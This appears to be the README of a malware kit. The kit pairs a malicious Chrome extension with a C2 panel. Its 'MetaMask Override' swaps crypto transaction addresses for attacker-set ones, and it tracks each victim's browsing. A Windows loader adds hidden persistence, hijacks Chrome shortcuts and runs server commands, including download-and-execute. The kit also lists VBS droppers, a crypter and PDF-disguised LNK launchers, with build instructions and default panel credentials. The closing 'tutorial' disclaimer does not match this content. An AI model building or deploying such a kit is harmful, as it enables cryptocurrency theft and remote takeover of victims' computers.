1. extension 
2. load 
 - panel - panel and server for loader 
 - loader - loader 
3. scrypt - additional utilities 
4. server - server and panel for extension 

**Each section has a readme describing how it works** 

## Extension server:
**Authorization data**
log - admin
pass - password

**Device Tracker** 
Display statistics of connected devices: 
Statistics of connected devices: 
- Status (online/offline)
- Identifie(device tag)
- URL of the active tab 
- Title 
- Timestamp 
**MetaMask Override**
Enter 10 preset values for swap (configmeta.json)
 Output log table of successful swap: 
- Device Status 
- Override Address (spoofed address where the transaction went)
- Timestamp
**Extension Panel**
- Real-time randomizer value output (displayed to the user regardless of whether it was swapped or not).
- Possibility to enter preset values by groups 
- Displaying the history of randomizer swapping 
- Display of the last generated number 
**Settings**
- Changing login and password of authorization in the panel (stored in configpass.json)

## Loader build//C2 loader:
**Commands for the installer** 
restart_chrome - Restarts Chrome for the victim 
update_extension - Loads a new extension and removes the old one.
delete - Deletes itself completely and all temporary files and records 
load_and_run - Loads any file into the system and executes it 

Auth: 
Login: admin 
Password: admin 

**Panel Structure**
panel/
├─── server/
│ ├─── server.js # Server main file
│ ├─── routes/         
│ │ │ ├──── commands.js # Route for working with commands
│ │ ├──── auth.js # Route for working with authorization
│ │ ├├─── config.js # Route for working with configuration
│ └──── public/          
│ ├─── index.html # Home 
│ ├─── xlock.html # Page
│ ├─── config.html # Settings
│ ├─── login.html # Authorization
│ ├──── css/         
│ │ │ └─── styles.css # Basic styles
│ ├─── config/          
│ │ │ └──── xlock.json # Configuration file
│ └──── js/        
│ └──── app.js # Home 
│ └──── xlock.js # Page
│ └─── login.js # Authorization
│ └─── config.js # Settings 
└──── package.json # Configuration npm

#MongoDB - Database for data storage #
**Home**
- Filtering by Online/Offline and searching the database by device ID
- Enter device ID and select command
- Display device list 
- Display command and device history
**Configuration** 
- Ability to edit Ulr Lock and Url Unlock for Xlock page

#### Build Windows - loadWin loader for Windows 
  - Architecture x64.
  - Uses Windows libraries: winshell, shutil.
  - Create autorun via shortcuts in Startup folder.
  - Restart Chrome using .bat file. 
  - Recursively search for all Chrome shortcuts and overwrite them.
  - Working with temporary files via %TEMP%.

*Built-in build obfuscator in plans needs to be finalized*
Build build: 
1. Installing PyInstaller: 
pip install pyinstaller

2. Building the EXE file: 
pyinstaller --onefile --add-data “extension;extension” loadwin.py

- The --add-data “extension;extension” parameter adds the extension folder to the build.
- After the build, the file loadwin.exe will appear in the dist folder.
- Install all dependencies before building 

Use the name loadwin.py / load.py / loader.py depending on your purpose. 
- loadwin.py is a full-fledged version that is installed on the system, loads the extension into chrome, waits for commands from the server and executes them.
- loader.py - the version where the extension is installed in chrome, connects to the server and executes only the restart command. 
- load.py - full analog of loadwin.py except for the warming in the system, installs the extension and waits for all commands from the server and executes them. 
- The sample build is located /scrypt/exe 
For efficient operation requires admin rights, without them works unstable. 

Functionality: 
1. At first startup, the build copies the extension folder to %APPDATA%\.hidden_extension\extension, if there is no copy there yet.

2. Creates a shortcut in the autoloader folder (%AppData%\Microsoft\Windows\Start Menu\Programs\Startup) so that it will start automatically again every time you log in.

3. searches for Google Chrome.lnk or Chrome.lnk files on the desktop and in the Start menu and Taskbar. If the shortcut points to chrome.exe, passes the --load-extension=“extension path” parameter to it.

4. Kills all Chrome processes (taskkill), waits for 3 minutes and launches chrome again with the updated shortcut via a temporary .bat.

5. Requests the server every 30 seconds, receiving commands:
     - restart_chrome - updates shortcuts and restarts Chrome.  
     - load_and_run - downloads the .exe to a temporary folder and runs it.  
     - update_extension - downloads the .zip, replaces the old extension and restarts Chrome again.  
     - delete - removes the extension, the autoload shortcut, and the .exe itself (via .bat).

6. The delete command kills Chrome, deletes the hidden folder with the extension, removes the autoloader and deletes the .exe itself via .bat.

Create a standard package.json: npm init -y
Install the npm-check module: npm install -g npm-check
Install missing dependencies: npm-check --install
Check command: npm-check --install
Start the server: npm start
Panel Url: http://localhost/ 
MonroDB is used, install monrodb compass
## Full pack scripts: 
- Cvbs is a set of different vbs modifications that download and run install.vbs on different versions of win. 
- DropDemo is a demo version of the crypter for load.exe (installer).
- exe is a build of a ready load.exe, script on py + extensions are packed into one exe and the output is load.exe installer. 
- lnk is a script to automatically create lnk that opens pdf and runs install.vbs to load and silently run load.exe 
- loadermac is the macOS version of the installer, demo version in progress, requires admin password.

Use the repository wisely, this is a tutorial demonstration of integrating an extension into chromeium and manipulating randomizers. You are solely responsible for the use of this code. Any illegal actions are condemned and not supported. 
